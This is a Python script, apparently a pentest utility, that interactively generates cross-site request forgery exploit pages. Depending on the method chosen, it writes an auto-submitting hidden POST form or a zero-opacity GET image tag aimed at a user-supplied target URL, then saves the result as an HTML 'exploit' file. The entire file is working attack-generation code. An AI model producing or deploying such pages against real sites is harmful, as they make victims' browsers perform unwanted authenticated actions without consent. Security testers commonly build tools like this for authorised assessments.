import urllib
import urllib.parse


class csrf:
    def __init__(self):
        print("[+] Select method:")  # Printing options for HTTP methods
        print("")
        print("1.POST")
        print("2.GET")
        print("other options will be added soon.")
        print("")
        method = str(input("[+] Select 1 or 2 : "))
        print("")
        options1 = "1", "2"
        if method == "1":  # POST Method
            print("")
            action = str(input("[+] Enter 'target' URL: "))
            print("")
            exploittitle = "\n[!] Exploit:"
            formstart = "\t<form action=\"%s\" method=\"POST\" name=\"exploit\">" % (action)
            formend = "\t</form>\n\t<script>document.exploit.submit()</script>"

            # The code below asks the parameter values
            num_array = list()
            name_array = list()
            num = input("Enter how many parameters you want to enter? :")
            if num.isdigit():

                print("")
                print("Enter parameter 'Name' and 'Value': ")
                for i in range(int(num)):  # FOR loop for asking Parameter Name and Value.
                    print("")
                    n = input("Name : ")
                    n1 = input("Value: ")
                    num_array.append(str(n))
                    name_array.append(str(n1))

                print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
                extension = ".html"
                name = str(input("Filename: "))
                filename = name + extension
                file = open(filename, "w")

                file.write(formstart)
                file.write("\n")
                print(exploittitle)
                print(formstart)
                # FOR loop for printing user entered values in the final exploit.
                for x, y in zip(num_array, name_array):
                    name = str(x)
                    value = str(y)
                    finalstring = "\t<input type=\"hidden\" name=\"" + name + "\" value=\"" + value + "\">\n"
                    file.write(finalstring)
                print(formend)
                file.write(formend)
                file.close()
                print("Your exploit is saved as %s" % filename)
                print("")
            else:
                print("Invalid value!")  # GET
        if method == "2":  # GET Method
            action = str(input("[+] Enter 'target' URL(must end with /) e.g, https://www.google.com/: "))
            num = input("Enter how many parameters you want to enter? :")
            if num.isdigit():
                num_array = list()
                name_array = list()
                print("")
                print("Enter parameter 'Name' and 'Value': ")
                for i in range(int(num)):  # FOR loop for asking Parameter Name and Value.
                    print("")
                    n = input("Name : ")
                    n2 = n
                    n1 = input("Value: ")
                    n3 = n1
                    num_array.append(str(n2))
                    name_array.append(str(n3))
                finalstring = dict(zip(num_array, name_array))
                urlencoded = urllib.parse.urlencode(finalstring)

            exploittitle = "\n[!] Exploit:"
            print("")
            print(exploittitle)
            # print ("\t<img src=\"%s"+"?"+"%s"+"\" style=\"opacity:0\">"%(action, urlencoded))
            print('\t<img src="' + action + '?' + urlencoded + '" style="opacity:0">')
            jsonoutput = '''<img src=\"%s?%s\" style=\"opacity:0\">''' % (action, urlencoded)
            print("")
            print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
            extension = ".html"
            name = input("Filename: ")
            filename = name + extension
            file = open(filename, "w")

            file.write(jsonoutput)
            file.close()
            print("Your exploit is saved as %s" % filename)
            print("")

        print("")
        exittheprogram = input("Press Enter to exit.")
        exit()
